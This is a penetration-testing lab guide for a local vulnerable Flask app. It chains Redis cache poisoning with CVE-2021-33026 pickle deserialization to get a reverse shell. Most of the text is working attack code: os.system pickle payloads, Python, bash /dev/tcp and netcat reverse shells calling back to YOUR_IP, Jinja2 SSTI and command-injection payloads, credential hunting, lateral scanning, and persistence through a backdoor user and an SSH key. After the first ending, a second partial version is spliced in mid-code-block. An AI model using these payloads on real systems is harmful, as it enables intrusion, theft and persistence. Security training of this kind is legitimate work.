# Lab 06 - Redis Cache Poisoning and Reverse Shell Exploitation

## Objective

Exploit the Flask-Caching CVE-2021-33026 vulnerability by:
1. Testing Redis connectivity on port 6379
2. Authenticating with discovered credentials
3. Testing cache poisoning with benign commands
4. Uploading a reverse shell script via ZIP file
5. Poisoning the Redis cache with malicious pickle payload
6. Setting up netcat listener on port 4444
7. Triggering exploitation to achieve Remote Code Execution
8. Gaining reverse shell access to the container

## ‚ö†Ô∏è WARNING

This lab involves actual exploitation techniques that achieve Remote Code Execution. **Only perform these actions on systems you own or have explicit written permission to test.** Unauthorized access to computer systems is illegal and punishable by law.

## Background

### CVE-2021-33026: Flask-Caching Pickle Deserialization RCE

Flask-Caching versions before 1.10.1 use Python's `pickle` module for serializing cached objects. The `pickle` module is inherently unsafe when handling untrusted data because it can execute arbitrary code during deserialization.

**Attack Flow:**
1. **Identify cached endpoint**: Find an endpoint that stores/retrieves cached data
2. **Craft malicious pickle**: Create a pickle payload that executes our reverse shell
3. **Poison the cache**: Inject malicious pickle into Redis using direct connection
4. **Trigger deserialization**: Access the cached endpoint via HTTP
5. **Code execution**: The application unpickles our payload, executing our code
6. **Reverse shell**: Connection established to our netcat listener

### Why This Works

When Python unpickles data, special methods like `__reduce__()` can specify arbitrary callables to execute:

```python
class RCE:
    def __reduce__(self):
        import os
        return (os.system, ('/bin/bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"',))
```

When this object is pickled and then unpickled, it executes the `os.system()` command with our reverse shell payload.

## Prerequisites

- Completed Labs 01-05
- Redis credentials obtained from Lab 04
- Understanding of Redis and Python pickle
- `redis-cli` (optional but helpful)
- `netcat` (`nc`) installed
- Your local IP address (for reverse shell callback)

### Install Redis CLI (Optional)

**macOS:**
```bash
brew install redis
```

**Linux:**
```bash
sudo apt-get install redis-tools
```

## Steps

### Phase 1: Redis Connectivity Testing

### 1. Test Redis Port Accessibility

First, verify that Redis port 6379 is accessible:

```bash
# Test if port 6379 is open
nc -zv localhost 6379

# Expected output:
# Connection to localhost port 6379 [tcp/*] succeeded!
```

If the port is open, Redis is accessible from your host machine.

### 2. Connect to Redis and Authenticate

Connect to Redis using the password you discovered in Lab 04:

```bash
# Method 1: Using redis-cli (if installed)
redis-cli -h localhost -p 6379

# Once connected, authenticate
AUTH your_redis_password_here

# Test connection
PING
```

**Expected responses:**
```
127.0.0.1:6379> AUTH your_password
OK
127.0.0.1:6379> PING
PONG
```

```bash
# Method 2: Using nc (if redis-cli not available)
nc localhost 6379

# Type commands manually:
AUTH your_redis_password_here
PING
```

### 3. Explore Existing Cache Data

Without disrupting the application, examine what's cached:

```bash
# List all keys
KEYS *

# Example output:
# 1) "flask_cache_result_abc123"
# 2) "flask_cache_session_xyz789"

# Examine a key's type
TYPE flask_cache_result_abc123

# Get value (may be binary/pickled data)
GET flask_cache_result_abc123

# Check key expiration
TTL flask_cache_result_abc123
```

**Document the cache key format:**
```bash
# Note the pattern - typically:
# flask_cache_<endpoint>_<identifier>
# or
# cache:<function_name>:<args>
```

### Phase 2: Test Benign Cache Poisoning

Before deploying our reverse shell, test that cache poisoning works without disrupting the application.

### 4. Create a Benign Test Pickle Payload

Create a simple test to execute `whoami`:

```bash
# Create test_pickle.py
cat > test_pickle.py << 'EOF'
import pickle
import base64
import os

class BenignRCE:
    def __reduce__(self):
        # Simple command: create a test file
        cmd = 'touch /tmp/cache_poison_test'
        return (os.system, (cmd,))

# Serialize the payload
payload = pickle.dumps(BenignRCE())
print("Base64 Payload:")
print(base64.b64encode(payload).decode())
EOF

# Run it
python3 test_pickle.py
```

### 5. Inject Test Payload into Redis

```bash
# Copy the base64 output from previous step
# In redis-cli:

SET test_cache_key "YOUR_BASE64_PAYLOAD_HERE"

# Verify it was set
GET test_cache_key
EXISTS test_cache_key
```

### 6. Test Deserialization (Skip if Unsure)

To test if the payload executes, you'd need to trigger the cache retrieval. For now, verify you can set/get cache values. We'll do actual exploitation next.

```bash
# Check if test file was created (only if app retrieved the key)
# Don't worry if this doesn't work yet - it confirms Redis access

# Clean up test key
DEL test_cache_key
```

### Phase 3: Upload Reverse Shell

Now let's upload a reverse shell script that we can execute via cache poisoning.

### 7. Get Your IP Address

You need your IP for the reverse shell callback:

```bash
# macOS WiFi
ipconfig getifaddr en0

# macOS Ethernet
ipconfig getifaddr en1

# Linux
hostname -I | awk '{print $1}'

# Or
ip addr show | grep "inet " | grep -v 127.0.0.1
```

**Note your IP** (e.g., `192.168.1.100`)

### 8. Create Reverse Shell Python Script

Create a reverse shell that will connect back to your listener:

```bash
cat > reverse_shell.py << 'EOF'
#!/usr/bin/env python3
import socket
import subprocess
import os

# Replace with your IP and port
LHOST = "YOUR_IP_HERE"  # e.g., "192.168.1.100"
LPORT = 4444

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((LHOST, LPORT))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/bash", "-i"])
except Exception as e:
    pass
EOF

# Replace YOUR_IP_HERE with your actual IP
sed -i '' 's/YOUR_IP_HERE/192.168.1.100/g' reverse_shell.py
# For Linux, use: sed -i 's/YOUR_IP_HERE/192.168.1.100/g' reverse_shell.py
```

### 9. Package Reverse Shell in ZIP File

The application accepts ZIP files, so package the reverse shell with a dummy resume:

```bash
# Create a dummy resume file
cat > legitimate_resume.txt << 'EOF'
Jane Doe
Senior Software Engineer

SKILLS:
- Python, Flask, Redis
- Docker, Kubernetes
- Security Testing
EOF

# Create a directory for the ZIP contents
mkdir upload_package
cp reverse_shell.py upload_package/
cp legitimate_resume.txt upload_package/

# Create the ZIP file
cd upload_package
zip ../malicious_upload.zip reverse_shell.py legitimate_resume.txt
cd ..
```

### 10. Upload the ZIP File via Web Interface

```bash
# Upload using curl
curl -X POST http://localhost:8080/upload \
  -F "file=@malicious_upload.zip" \
  -F "description=Senior Engineer Applications"

# Or upload manually through the web interface:
# 1. Open http://localhost:8080 in browser
# 2. Navigate to upload section
# 3. Select malicious_upload.zip
# 4. Click Upload
```

### 11. Verify Reverse Shell File is Accessible

Check if the reverse shell was extracted and is accessible:

```bash
# Try to access the reverse shell script
curl http://localhost:8080/static../resumes/reverse_shell.py

# You should see the Python code
# If you see it, the file is accessible and ready to execute
```

**If you can see the reverse_shell.py content, you're ready for exploitation!**

### Phase 4: Cache Poisoning for RCE

### 12. Create Malicious Pickle Payload

Now create the actual exploit payload that executes our reverse shell:

```bash
cat > exploit_payload.py << 'EOF'
import pickle
import base64
import os

class ReverseShellRCE:
    def __reduce__(self):
        # Execute the uploaded reverse shell
        cmd = 'python3 /app/resumes/reverse_shell.py'
        return (os.system, (cmd,))

# Serialize the malicious object
payload = pickle.dumps(ReverseShellRCE())
encoded_payload = base64.b64encode(payload).decode()

print("="*60)
print("MALICIOUS PICKLE PAYLOAD (Base64)")
print("="*60)
print(encoded_payload)
print("="*60)
print("\nRedis Command:")
print(f'SET flask_cache_exploit "{encoded_payload}"')
print("="*60)
EOF

python3 exploit_payload.py
```

**Copy the base64 payload output** - you'll need it for Redis.

### 13. Alternative: Direct Reverse Shell Payload

If file upload doesn't work, use a direct reverse shell in the pickle:

```bash
cat > exploit_direct.py << 'EOF'
import pickle
import base64

class DirectReverseShell:
    def __reduce__(self):
        import os
        # Replace YOUR_IP with your actual IP
        cmd = 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])\''
        return (os.system, (cmd,))

payload = pickle.dumps(DirectReverseShell())
print("Direct Reverse Shell Payload (Base64):")
print(base64.b64encode(payload).decode())
EOF

# Edit to include your IP
sed -i '' 's/YOUR_IP/192.168.1.100/g' exploit_direct.py
python3 exploit_direct.py
```

### Phase 5: Exploitation

### 14. Start Netcat Listener

In a **new terminal window**, start your netcat listener:

```bash
# Terminal 1: Start listener on port 4444
nc -lvnp 4444

# Expected output:
# Listening on 0.0.0.0 4444
```

**Keep this terminal open** - your reverse shell will connect here.

### 15. Poison Redis Cache

In your **original terminal**, connect to Redis and inject the malicious payload:

```bash
# Terminal 2: Connect to Redis
redis-cli -h localhost -p 6379

# Authenticate
AUTH your_redis_password_here

# Inject malicious payload
# Replace PAYLOAD_HERE with your base64 payload from step 12 or 13
SET flask_cache_exploit "PASTE_YOUR_BASE64_PAYLOAD_HERE"

# Verify it was set
EXISTS flask_cache_exploit

# Check expiration (should return -1 for no expiration)
TTL flask_cache_exploit
```

### 16. Trigger the Exploit

Now trigger the cache deserialization by accessing a cached endpoint.

**Method 1: If you know a cached endpoint from app.py analysis:**

```bash
# Terminal 3: Trigger deserialization
curl http://localhost:8080/results/exploit

# Or whichever endpoint uses caching
curl http://localhost:8080/cached_endpoint/exploit
```

**Method 2: Create an endpoint that retrieves our poisoned key:**

This depends on how the app is structured. Look at `app.py` to find which endpoint would trigger cache retrieval.

**Method 3: Use GET request with session cookie:**

```bash
# If the app caches session data
curl -b "session=exploit" http://localhost:8080/results

# Or try the profile endpoint
curl http://localhost:8080/profile/exploit
```

### 17. Receive Reverse Shell

**Check Terminal 1** (your netcat listener). If exploitation succeeded, you should see:

```
Connection from 172.17.0.X:XXXXX
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@container_id:/app#
```

**YOU HAVE A SHELL!** üéâ

### Phase 6: Post-Exploitation

### 18. Stabilize the Shell

Make the shell more usable:

```bash
# Upgrade to interactive shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Set terminal type
export TERM=xterm

# Enable command history and completion
# Press Ctrl+Z to background
# Then in your terminal:
stty raw -echo; fg
# Press Enter twice
```

### 19. Enumerate the Container

Now explore the compromised system:

```bash
# Check who you are
whoami
id

# Check hostname
hostname

# Check OS
cat /etc/os-release
uname -a

# Check current directory
pwd
ls -la

# Check environment variables
env | grep -i password
env | grep -i redis
env | grep -i secret

# Check network
ip addr
netstat -tulpn

# Check running processes
ps aux
```

### 20. Access Redis Directly from Container

Since you're inside the container, you can access Redis directly:

```bash
# The container likely has redis-cli or Python
python3 << 'EOF'
import redis
r = redis.Redis(
    host='resume_crunch_redis_container',
    port=6379,
    password='your_password_here',
    db=0
)
print(r.ping())
print(r.keys('*'))
EOF
```

### 21. Examine Uploaded Resumes

Check what data is stored in the resumes directory:

```bash
# List uploaded resumes
ls -la /app/resumes/

# View your uploaded files
cat /app/resumes/reverse_shell.py
cat /app/resumes/legitimate_resume.txt

# Check if there are other users' resumes
cat /app/resumes/*.txt
```

### 22. Examine Application Source Code

You already have `app.py` from Lab 04, but now you can view it directly:

```bash
# View the actual running app
cat /app/app.py

# Look for secrets
grep -i "password\|secret\|key\|token" /app/app.py

# Check configuration
cat /app/config.py 2>/dev/null
cat /app/.env 2>/dev/null
```

### 23. Check Docker Environment

Understand the container environment:

```bash
# Check if Docker socket is mounted (dangerous!)
ls -la /var/run/docker.sock

# Check for Docker binaries
which docker

# Check environment
env | grep DOCKER

# View container hostname (container ID)
cat /etc/hostname
```

### 24. Attempt Lateral Movement

Try to discover and access other containers:

```bash
# Check /etc/hosts for other containers
cat /etc/hosts

# Try to reach Redis container
ping resume_crunch_redis_container -c 2

# Try to reach other services
nmap -sn 172.17.0.0/24  # if nmap is installed

# Or manually probe
for i in {1..10}; do 
    ping -c 1 -W 1 172.17.0.$i && echo "Host 172.17.0.$i is up"
done
```

### Phase 7: Cleanup and Documentation

### 25. Clean Up Malicious Artifacts (Optional)

To avoid leaving obvious traces:

```bash
# In the reverse shell, remove the uploaded reverse shell
rm /app/resumes/reverse_shell.py

# Exit the shell
exit
```

```bash
# In redis-cli, remove malicious cache entry
redis-cli -h localhost -p 6379
AUTH your_password
DEL flask_cache_exploit
exit
```

### 26. Document Your Findings

Create a comprehensive penetration test report:

```bash
cat > penetration-test-report.md << 'EOF'
# ResumeCrunch Penetration Test Report

## Executive Summary
Successfully achieved Remote Code Execution (RCE) and gained reverse shell access to the ResumeCrunch Flask application container through a multi-stage attack chain exploiting CVE-2021-33026.

## Vulnerability Summary

### Critical Findings

#### 1. Nginx Path Traversal (CVE-CUSTOM-001)
- **Severity**: HIGH
- **Affected**: Nginx /static location configuration
- **Impact**: Complete source code disclosure
- **Exploited**: YES

#### 2. Flask-Caching Pickle Deserialization RCE (CVE-2021-33026)
- **Severity**: CRITICAL
- **Affected**: Flask-Caching < 1.10.1
- **Impact**: Remote Code Execution
- **Exploited**: YES

#### 3. Exposed Redis Instance
- **Severity**: HIGH
- **Affected**: Redis port 6379
- **Impact**: Direct database access, cache poisoning
- **Exploited**: YES

#### 4. Unrestricted File Upload
- **Severity**: MEDIUM
- **Affected**: /upload endpoint
- **Impact**: Arbitrary file upload (used for reverse shell deployment)
- **Exploited**: YES

## Attack Chain

### Phase 1: Reconnaissance
1. Started application and tested functionality
2. Used dirb to discover /static/ directory
3. Used curl to identify Nginx web server and session cookies

### Phase 2: Path Traversal Exploitation
1. Tested Nginx off-by-one slash misconfiguration on /static
2. Discovered path traversal vulnerability: /static../
3. Used dirb to enumerate accessible files
4. Downloaded app.py (Flask application source code)

### Phase 3: Information Gathering
1. Extracted Redis credentials from source code
2. Used dirb with Docker wordlist to find configuration files
3. Downloaded: Dockerfile, docker-compose.yml, nginx.conf, redis.conf
4. Mapped complete infrastructure

### Phase 4: Vulnerability Analysis
1. Analyzed app.py for Redis usage and caching patterns
2. Verified resume upload folder accessibility via /static../resumes/
3. Ran pip-audit on requirements.txt
4. Identified Flask-Caching CVE-2021-33026 vulnerability

### Phase 5: Exploitation
1. Tested Redis connectivity on port 6379 - SUCCESS
2. Authenticated with discovered credentials - SUCCESS
3. Created reverse shell Python script
4. Uploaded reverse shell via ZIP file through web interface
5. Verified file accessible at /static../resumes/reverse_shell.py
6. Created malicious pickle payload for cache poisoning
7. Started netcat listener on port 4444
8. Injected pickle payload into Redis cache
9. Triggered cache deserialization via HTTP request
10. Received reverse shell connection - COMPLETE RCE

## Proof of Concept

### Exploit Commands
```bash
# 1. Create reverse shell
cat > reverse_shell.py << 'SHELL'
[reverse shell code]
SHELL

# 2. Upload via ZIP
zip malicious.zip reverse_shell.py legitimate_resume.txt
curl -F "file=@malicious.zip" http://localhost:8080/upload

# 3. Create pickle payload
python3 exploit_payload.py

# 4. Poison cache
redis-cli -h localhost -p 6379
AUTH password
SET flask_cache_exploit "[base64_payload]"

# 5. Start listener
nc -lvnp 4444

# 6. Trigger exploitation
curl http://localhost:8080/results/exploit

# 7. Receive reverse shell
[Connection established]
```

## Impact Assessment

### Confidentiality: HIGH
- Complete source code disclosed
- All credentials exposed
- Potential access to user data (resumes)

### Integrity: HIGH
- Ability to modify cached data
- Ability to upload arbitrary files
- Full control over application container

### Availability: HIGH
- Could delete cached data disrupting service
- Could modify application code
- Could terminate application processes

## Remediation Recommendations

### Immediate (Critical)

1. **Fix Nginx Configuration**
   ```nginx
   location /static/ {
       alias /app/static/;
   }
   ```

2. **Upgrade Flask-Caching**
   ```bash
   pip install Flask-Caching>=1.10.1
   ```

3. **Restrict Redis Access**
   - Remove port exposure from docker-compose.yml
   - Use internal Docker networking only

4. **Implement File Upload Validation**
   - Whitelist allowed file extensions
   - Scan uploaded files
   - Isolate upload directory

### Short-term (High Priority)

5. **Use Environment Variables for Secrets**
   - Move all credentials to .env file
   - Never commit secrets to source code

6. **Implement Security Headers**
   - Add X-Frame-Options, CSP, HSTS

7. **Input Validation**
   - Sanitize all user inputs
   - Validate cache keys

8. **Access Controls**
   - Implement proper authentication
   - Add authorization checks

### Long-term (Best Practices)

9. **Security Audit**
   - Regular penetration testing
   - Code security reviews

10. **Dependency Management**
    - Automated vulnerability scanning (pip-audit in CI/CD)
    - Keep all dependencies updated

11. **Container Security**
    - Run containers as non-root user
    - Implement least privilege principles
    - Use read-only file systems where possible

12. **Monitoring & Detection**
    - Log suspicious activities
    - Monitor Redis access patterns
    - Alert on cache anomalies

## Timeline
- Lab 01: Application setup and testing
- Lab 02: Directory discovery and reconnaissance
- Lab 03: Path traversal exploitation
- Lab 04: Source code and configuration extraction
- Lab 05: Vulnerability analysis and planning
- Lab 06: Successful RCE via cache poisoning

## Conclusion
The ResumeCrunch application had multiple critical vulnerabilities that, when chained together, allowed for complete system compromise. All identified issues should be remediated immediately to prevent real-world exploitation.
EOF
```

## Verification Checklist

- [ ] Tested Redis port 6379 accessibility
- [ ] Successfully authenticated to Redis
- [ ] Explored existing cached data
- [ ] Created benign test pickle payload
- [ ] Tested cache key injection
- [ ] Created reverse shell Python script
- [ ] Packaged reverse shell in ZIP file
- [ ] Uploaded ZIP via web interface
- [ ] Verified reverse shell file accessible at /static../resumes/
- [ ] Created malicious pickle payload
- [ ] Started netcat listener on port 4444
- [ ] Injected malicious payload into Redis
- [ ] Triggered cache deserialization
- [ ] Received reverse shell connection
- [ ] Performed post-exploitation enumeration
- [ ] Documented complete attack chain
- [ ] Cleaned up artifacts (optional)

## Troubleshooting

### Reverse Shell Won't Connect

```bash
# Check if your listener is running
lsof -i :4444

# Try different ports (some may be blocked)
nc -lvnp 443   # HTTPS port often allowed
nc -lvnp 8080  # Alternative HTTP port

# Verify your IP address is correct
# Test connectivity from container (if you have access)
ping YOUR_IP

# Try bash reverse shell instead
cmd = '/bin/bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'

# Try nc reverse shell
cmd = 'nc -e /bin/bash YOUR_IP 4444'

# Try Python reverse shell (inline)
cmd = 'python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'YOUR_IP\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/bash\',\'-i\'])"'
```

### Pickle Payload Not Executing

```bash
# Verify payload was cached
redis-cli -h localhost -p 6379
AUTH password
EXISTS flask_cache_exploit
GET flask_cache_exploit

# Check application logs
docker logs resumecrunch-app

# Verify you're triggering the right endpoint
# Review app.py for cached routes

# Try setting payload with different cache key
# Match existing cache key patterns from KEYS * output
```

### Can't Access Uploaded Files

```bash
# Verify upload succeeded
curl http://localhost:8080/static../resumes/ | grep reverse_shell

# Check if filename changed
ls -la /app/resumes/  # (if you have shell access)

# Try different path traversal depths
curl http://localhost:8080/static../app/resumes/reverse_shell.py

# Verify file permissions
# File must be readable by application user
```

### Redis Connection Fails

```bash
# Verify port is open
nc -zv localhost 6379

# Check docker-compose.yml for port mapping
grep -A 5 "redis:" docker-compose.yml | grep ports

# Verify Redis container is running
docker ps | grep redis

# Try connecting to container directly
docker exec -it resume_crunch_redis_container redis-cli
AUTH password
PING
```

### Shell is Unstable

```bash
# Upgrade shell immediately after connection
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Set proper terminal
export TERM=xterm-256color

# Enable raw input
# Press Ctrl+Z
stty raw -echo; fg
# Press Enter twice

# If shell dies, restart listener and re-exploit
# The cache entry persists until deleted or expired
```

## Learning Outcomes

By completing this lab, you have learned:

### Technical Skills
- Redis direct access and manipulation
- Python pickle deserialization exploitation
- Crafting malicious pickle payloads
- Cache poisoning techniques
- Reverse shell deployment methods
- Post-exploitation enumeration
- Multi-stage attack chain execution

### Security Concepts
- Insecure deserialization vulnerabilities
- Cache poisoning attack vectors
- Defense evasion techniques
- Responsible exploitation practices
- Impact of chained vulnerabilities
- Container security weaknesses

### Best Practices
- Thorough reconnaissance before exploitation
- Testing with benign payloads first
- Minimizing disruption to production systems
- Cleaning up after testing
- Comprehensive documentation
- Ethical hacking principles

## Key Takeaways

1. **Defense in Depth**: Multiple vulnerabilities chained together led to RCE
2. **Insecure Deserialization**: Never unpickle untrusted data
3. **Exposed Services**: Redis should never be exposed to untrusted networks
4. **Configuration Matters**: Small misconfigurations (Nginx trailing slash) have big impacts
5. **Dependency Management**: Keep libraries updated to patch known CVEs
6. **Credential Protection**: Never hardcode credentials in source code

## Next Steps

### For Further Learning
- [ ] Research other pickle deserialization exploits
- [ ] Learn about alternative serialization formats (JSON, MessagePack)
- [ ] Study container escape techniques
- [ ] Explore privilege escalation methods
- [ ] Practice writing secure Flask applications

### For the Lab Environment
- [ ] Review security best practices documentation
- [ ] Implement fixes for discovered vulnerabilities
- [ ] Test remediation effectiveness
- [ ] Set up monitoring and detection

### For Real-World Applications
- [ ] Never perform unauthorized testing
- [ ] Always get written permission
- [ ] Follow responsible disclosure practices
- [ ] Document findings professionally
- [ ] Provide actionable remediation guidance

---

## ‚ö†Ô∏è Legal and Ethical Reminder

The techniques demonstrated in this lab are for **educational purposes only**. You must:

- ‚úÖ Only test systems you own
- ‚úÖ Only test with explicit written permission
- ‚úÖ Follow responsible disclosure for real vulnerabilities
- ‚úÖ Respect data privacy and confidentiality
- ‚úÖ Use knowledge to improve security, not cause harm

- ‚ùå Never test production systems without authorization
- ‚ùå Never access others' data without permission
- ‚ùå Never disrupt services or destroy data
- ‚ùå Never use these techniques for malicious purposes

---

[‚Üê Previous: Vulnerability Analysis](lab-05-test-vulns.md) | [Back to Lab Overview](lab-overview.md)
print(base64.b64encode(payload).decode())
```

Replace `YOUR_IP` with your actual IP address.

#### 2. Run the Payload Generator

```bash
python3 malicious_pickle.py
```

Copy the base64 output.

#### 3. Inject into Redis Cache

Find an endpoint that caches user data:

```bash
# Example: If the app caches resume data
curl -X POST http://localhost:8080/upload \
  -F "resume=@evil.txt" \
  -F "user_id=admin"
```

Or directly inject into Redis (if accessible):

```bash
redis-cli -h localhost set "cache:user:admin" "YOUR_BASE64_PAYLOAD"
```

#### 4. Set Up Listener

Before triggering the payload, set up a netcat listener:

```bash
# Terminal 1: Start listener
nc -lvnp 4444
```

#### 5. Trigger the Payload

Access the endpoint that retrieves cached data:

```bash
# Terminal 2: Trigger deserialization
curl http://localhost:8080/profile/admin
```

If successful, you should get a shell in Terminal 1!

### Scenario B: Server-Side Template Injection (SSTI)

If the application caches and renders templates:

#### 1. Test for SSTI

Try template injection payloads:

```bash
# Jinja2 SSTI test
curl -X POST http://localhost:8080/upload \
  -d "name={{7*7}}"

# Check if output shows 49 instead of {{7*7}}
```

#### 2. Escalate to RCE

If SSTI is confirmed, escalate to code execution:

```bash
# Jinja2 RCE payload
PAYLOAD="{{ ''.__class__.__mro__[1].__subclasses__()[396]('whoami', shell=True, stdout=-1).communicate()[0].strip() }}"

curl -X POST http://localhost:8080/upload \
  -d "name=$PAYLOAD"
```

#### 3. Deploy Reverse Shell via SSTI

```bash
# Reverse shell payload
PAYLOAD="{{ ''.__class__.__mro__[1].__subclasses__()[396]('nc YOUR_IP 4444 -e /bin/sh', shell=True) }}"

# Start listener
nc -lvnp 4444

# Inject payload
curl -X POST http://localhost:8080/upload \
  -d "name=$PAYLOAD"
```

### Scenario C: Cache Key Injection

If you can control cache keys:

#### 1. Identify Cache Key Structure

```bash
# Test different cache keys
redis-cli --scan --pattern "cache:*"
```

#### 2. Inject Malicious Key

```bash
# Inject command into cache key
curl "http://localhost:8080/api/data?id=1; nc YOUR_IP 4444 -e /bin/sh"
```

## Step-by-Step Exploitation Guide

### Complete Attack Chain

1. **Start Listener**
```bash
# Terminal 1
nc -lvnp 4444
```

2. **Identify Injection Point**
```bash
# Test various endpoints for cache behavior
curl -v http://localhost:8080/upload -F "file=@test.txt"
curl -v http://localhost:8080/profile/test
curl -v "http://localhost:8080/api/search?q=test"
```

3. **Craft Payload**
```bash
# Based on the vulnerability found, craft appropriate payload
# Example for pickle deserialization:
python3 malicious_pickle.py > payload.txt
```

4. **Inject Payload**
```bash
# Inject via the vulnerable endpoint
curl -X POST http://localhost:8080/vulnerable-endpoint \
  -H "Content-Type: application/json" \
  -d '{"data": "YOUR_PAYLOAD"}'
```

5. **Trigger Execution**
```bash
# Access the cached data to trigger deserialization
curl http://localhost:8080/trigger-endpoint
```

6. **Verify Shell Access**
```bash
# In your listener terminal, you should now have a shell
# Try commands:
whoami
id
pwd
ls -la
```

## Post-Exploitation

Once you have shell access:

### 1. Enumerate the Environment

```bash
# Check user
whoami
id

# Check operating system
uname -a
cat /etc/os-release

# Check network
ip addr
netstat -tulpn

# Check running processes
ps aux
```

### 2. Find Sensitive Data

```bash
# Look for configuration files
cat /app/config.py
cat /app/.env
cat /etc/nginx/nginx.conf

# Check environment variables
env

# Look for database credentials
grep -r "password" /app/
grep -r "DATABASE" /app/
```

### 3. Access Redis Data

```bash
# Connect to Redis
redis-cli

# List all keys
KEYS *

# Get specific cached data
GET cache:sessions:admin
```

### 4. Lateral Movement

```bash
# Check other containers
docker ps

# Check network
nmap -sn 172.17.0.0/24
```

### 5. Establish Persistence

```bash
# Create a backdoor user (if you have privileges)
useradd -m backdoor -s /bin/bash
echo "backdoor:password123" | chpasswd

# Add SSH key (if SSH is available)
mkdir -p /root/.ssh
echo "YOUR_SSH_PUBLIC_KEY" >> /root/.ssh/authorized_keys
```

## Verification

- [ ] Successfully identified cache poisoning vulnerability
- [ ] Created malicious payload
- [ ] Injected payload into Redis cache
- [ ] Triggered payload execution
- [ ] Obtained reverse shell
- [ ] Enumerated the compromised system
- [ ] Documented the attack chain

## Troubleshooting

### Reverse Shell Won't Connect

```bash
# Check firewall
# Try different ports (e.g., 443, 80, 8080)

# Try different reverse shell methods
# Python reverse shell:
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Bash reverse shell:
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
```

### Payload Not Executing

```bash
# Verify payload was cached
redis-cli GET "cache:key"

# Check application logs
docker logs resumecrunch-app

# Verify deserialization is happening
# Add debug output to trace execution
```

### Shell is Unstable

```bash
# Upgrade to a better shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Background process with Ctrl+Z, then:
stty raw -echo; fg

# Set terminal
export TERM=xterm-256color
```

## Documentation Template

Document your successful exploit:

```markdown
# Redis Cache Poisoning Exploit Report

## Vulnerability Summary
- **Type**: Redis Cache Poisoning via [Pickle/SSTI/etc]
- **Severity**: Critical
- **Impact**: Remote Code Execution

## Attack Chain
1. [Step 1]
2. [Step 2]
3. [Step 3]

## Exploitation Steps
[Detailed commands used]

## Proof of Concept
[Screenshots or command output]

## Recommendations
1. Sanitize all user input before caching
2. Avoid using pickle for serialization
3. Implement input validation
4. Use Redis authentication
5. Restrict Redis network access

## References
- [CVE if applicable]
- [Related research]
```

## Learning Outcomes

By completing this lab, you have learned:
- How Redis cache poisoning works
- Techniques for exploiting deserialization vulnerabilities
- How to deploy reverse shells
- Post-exploitation enumeration techniques
- The importance of input validation and secure serialization

## Next Steps

With the lab complete, review:
- [Security Best Practices](security-best-practices.md)
- [Vulnerabilities Documentation](vulnerabilities.md)

Document your findings and prepare a remediation plan.

---

[‚Üê Previous: Test for Vulnerabilities](lab-05-test-vulns.md) | [Back to Lab Overview](lab-overview.md)
